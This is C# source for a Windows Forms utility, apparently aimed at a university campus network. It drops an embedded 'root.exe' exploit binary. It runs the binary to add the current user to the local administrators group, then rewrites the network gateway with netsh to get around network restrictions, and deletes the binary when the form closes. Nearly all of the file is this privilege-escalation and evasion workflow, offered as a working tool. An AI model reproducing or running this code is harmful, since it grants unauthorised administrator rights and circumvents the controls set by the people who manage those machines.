using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace Broken
{
    public partial class Form1 : Form
    {
        public class usrdata
        {
            public static string surnam = null;
        }
        
        private string RunCmd(string command)
        {
            #region 调用cmd
            return(allfuc.RunCmd(command));
            #endregion
        }

        private bool ChUsr()
        {
            #region 检查用户权限
            if (RunCmd("net localgroup administrators").IndexOf(System.Environment.UserName) >= 0)
            {
                logadd("已有管理员权限\n若需注销重登陆，密码为用户名");
                button1.Enabled = false;
                button2.Enabled = true;
                return true;
            }
            else
            {
                logadd("当前用户无权限，需要提权操作！");
                button1.Enabled = true;
                return false;
            }
            #endregion
        }

        private bool logadd(string str)
        {
            #region 记录状态
            label1.Text = label1.Text + "\n" + str;
            return true;
            #endregion
        }

        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            label1.Text = null;
            #region 释放root程序
            byte[] buf = Properties.Resources.root1;
            System.IO.FileStream f = new System.IO.FileStream(Application.StartupPath + "\\root.exe", System.IO.FileMode.Create);
            f.Write(buf, 0, buf.Length);
            f.Close();
            #endregion

            #region 读取用户
            logadd("读取用户...");
            usrdata.surnam = System.Environment.UserName;
            logadd("当前用户为："+usrdata.surnam);
            ChUsr();//确定当前账户已有管理员权限
            #endregion

        }

        private void button1_Click(object sender, EventArgs e)
        {
            #region 提权操作
            logadd("尝试提权...");
            RunCmd("root \"net localgroup administrators " + usrdata.surnam + " /add\"");
            label1.Text = null;
            ChUsr();//检查用户权限
            #endregion

        }

        private void label1_Click(object sender, EventArgs e)
        {
            
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string gateway=null,str=null;
            string[] strs;
            int i;

            #region 探测网关
            logadd("开始探测网关...");
//            str=RunCmd("tracert -d -h 1 www.cuit.edu.cn");//探测网关;此方法有误
//            strs = str.Split(new char[]{ '\n'});
//            gateway = strs[4].Substring(32);
            str = RunCmd("route print");
            strs = str.Split(new char[] { '\n' });
            for (i = 0; i < strs.Length; i++)
            {
                #region 第一方案
                if (strs[i].IndexOf("10.220.1.0") > -1 || strs[i].IndexOf("255.255.255.0") > -1)//路由表特征
                {
                    gateway = strs[i].Substring(36, 17).Replace(" ","");
                    break;
                }
                #endregion

                gateway = "127.0.0.1";
            }
            #endregion
            if (gateway.Split(new char[] { '.' }).Length == 4)
            {
                #region 设置网关
                logadd("探测到网关：" + gateway);
                if (ChUsr())
                {
                    logadd("正在设置网关...");
                    RunCmd("netsh interface ip set address name=\"本地连接\" gateway= " + gateway + " gwmetric=0");
                    RunCmd("explorer \"http://www.google.com\"");
                    logadd("完成");
                }
                else
                {
                    logadd("无权限");
                }
                #endregion
                button2.Enabled = false;
//                Application.Exit();
            }
            else
            {
                logadd("识别网关失败！");
                logadd(strs[4]);
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            RunCmd("del root.exe");
        }       
        
    }
}

